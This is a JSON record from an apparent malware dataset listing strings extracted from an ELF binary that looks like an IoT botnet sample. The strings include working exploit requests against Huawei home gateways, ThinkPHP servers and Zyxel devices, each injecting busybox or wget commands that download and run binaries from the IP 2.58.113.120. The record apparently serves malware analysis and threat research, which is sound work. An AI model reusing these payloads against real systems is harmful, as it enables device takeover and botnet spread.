{
    "malware_data": [
        {
            "filename": "70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8.elf",
            "filetype": "7F454C46",
            "filesize": "99KB",
            "hash_sha256": "70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8",
            "strings": [
                "'9uP",
                "  !$",
                " '0b",
                "` !$",
                "@ !$",
                "@ !'",
                "`0!$",
                "@(!$",
                " (!$",
                "@P!&E",
                "p4B**",
                "  !&E",
                "$Ev ",
                "@!&'",
                " !(B",
                "e(&)",
                "(!$D",
                "(!&%y",
                ",4Qfg'",
                " !$B",
                "$$bz,",
                "uz,'9z8",
                "@0!$",
                "P$dz8",
                "e0#$",
                "@!%)",
                "$E} ",
                "P!1B",
                "$c~`",
                "Lh#$",
                "`(!&F",
                "C0$,",
                "(!'9Q",
                " (!'9Q",
                " 0!'9Qp",
                "ff4Jfg",
                "4cNm",
                "$B09",
                "`(!$",
                " !$Qad<",
                "H#1)",
                "F8!0b",
                "HX%%J",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 2.58.113.120 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "UUUV/",
                "2.58.113.120",
                "<!: acam",
                " 18:1 ",
                "0125!8 ",
                "$5''#;&0",
                "509=:",
                "\"=.,\"",
                "'!$$;& ",
                "?;d509=:",
                "efg`a",
                "!'1&",
                ",<8#",
                "&;; ",
                ":217 10t",
                "!8 T",
                "'<188T",
                "1:5681T",
                "'-' 19T",
                "{6=:{6!'-6;,t",
                "nt5$$81 t:; t2;!:0T",
                ":7;&&17 T",
                "{6=:{6!'-6;,t$'T",
                "{6=:{6!'-6;,t?=88tymtT",
                "{$&;7{T",
                "{1,1T",
                "{20T",
                "{95$'T",
                "{$&;7{:1 { 7$T",
                "{' 5 !'T",
                "z5:=91T",
                "{$&;7{:1 {&;! 1T",
                "5''#;&0T",
                "{1 7{&1';8\"z7;:2T",
                ":591'1&\"1&tT",
                "{01\"{#5 7<0;3T",
                "{01\"{9='7{#5 7<0;3T",
                "$662*7!E",
                ";3=:T",
                "1: 1&T",
                "e365`70;9ag:<$ef1=d?2>T",
                ";!&71t",
                ":3=:1t",
                "!1&-T",
                "GET /index.php?s=/index/",
                "hink",
                "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1",
                "Accept-Encoding: gzip, deflate",
                "Accept: /",
                "User-Agent: Uirusu/2.0",
                "POST /cgi-bin/ViewLog.asp HTTP/1.1",
                "Host: 192.168.0.14:80",
                "User-Agent: python-requests/2.20.0",
                "Content-Length: 227",
                "Content-Type: application/x-www-form-urlencoded",
                " /bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh",
                "fffg",
                "/dev/null",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data.rel.ro",
                ".data",
                ".got",
                ".sbss",
                ".bss",
                ".mdebug.abi32"
            ]
        }
    ]
}